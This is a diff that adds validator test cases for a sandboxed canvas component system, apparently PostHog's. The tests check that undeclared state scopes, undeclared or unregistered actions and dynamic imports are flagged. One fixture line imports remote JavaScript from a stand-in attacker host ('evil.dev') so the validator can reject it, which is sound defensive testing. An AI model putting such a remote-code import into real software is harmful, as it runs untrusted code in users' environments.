@@ -79,6 +79,39 @@ class TestCanvasSourceAdapter(SimpleTestCase):
                 "import_not_allowed",
             ),
             (
+                "undeclared_state_access",
+                project(files={CANVAS_COMPONENT_PATH: CODE + 'ph.state.set("k", 1);'}),
+                "capability_missing_state",
+            ),
+            (
+                # get/set default to the user scope, so declaring only shared
+                # does not cover a scopeless call.
+                "state_default_user_scope_undeclared",
+                project(
+                    files={CANVAS_COMPONENT_PATH: CODE + 'ph.state.set("k", 1);'},
+                    capabilities={"posthog": {"state": ["shared"]}, "network": {"origins": []}},
+                ),
+                "capability_missing_state",
+            ),
+            (
+                "state_scope_literal_undeclared",
+                project(
+                    files={CANVAS_COMPONENT_PATH: CODE + 'ph.state.get("k", { scope: "shared" });'},
+                    capabilities={"posthog": {"state": ["user"]}, "network": {"origins": []}},
+                ),
+                "capability_missing_state",
+            ),
+            (
+                "undeclared_action_invoke",
+                project(files={CANVAS_COMPONENT_PATH: CODE + 'ph.actions.invoke("tasks.create", {});'}),
+                "capability_missing_action",
+            ),
+            (
+                "unregistered_declared_action",
+                project(capabilities={"posthog": {"actions": ["flags.delete"]}, "network": {"origins": []}}),
+                "action_not_registered",
+            ),
+            (
                 "dynamic_import",
                 project(files={CANVAS_COMPONENT_PATH: 'const m = await import("https://evil.dev/x.js");'}),
                 "forbidden_dynamic_import",
@@ -128,6 +161,26 @@ class TestCanvasSourceAdapter(SimpleTestCase):
         diagnostics = validate_source_project(candidate)
         self.assertTrue(has_errors(diagnostics), diagnostics)
         self.assertIn(expected_code, [d["code"] for d in diagnostics])
+
+    @parameterized.expand(
+        [
+            # A scopeless get/set defaults to the user scope.
+            ("default_user_scope", 'ph.state.set("k", 1);', ["user"]),
+            ("explicit_scope_literal", 'ph.state.get("k", { scope: "shared" });', ["shared"]),
+            # A scopeless list reads whatever is declared, so any declaration covers it.
+            ("scopeless_list", "ph.state.list();", ["shared"]),
+        ]
+    )
+    def test_declared_state_scopes_silence_the_state_diagnostic(self, _name, snippet, scopes):
+        candidate = project(
+            files={CANVAS_COMPONENT_PATH: CODE + snippet},
+            capabilities={
+                "posthog": {"insights": [], "inlineQueries": False, "captureEvents": [], "state": scopes},
+                "network": {"origins": []},
+            },
+        )
+        diagnostics = validate_source_project(candidate)
+        self.assertNotIn("capability_missing_state", [d["code"] for d in diagnostics])
 
     def test_direct_network_calls_warn_but_stay_publishable(self):
         # fetch() is blocked by the sandbox CSP, not by publish — a comment or
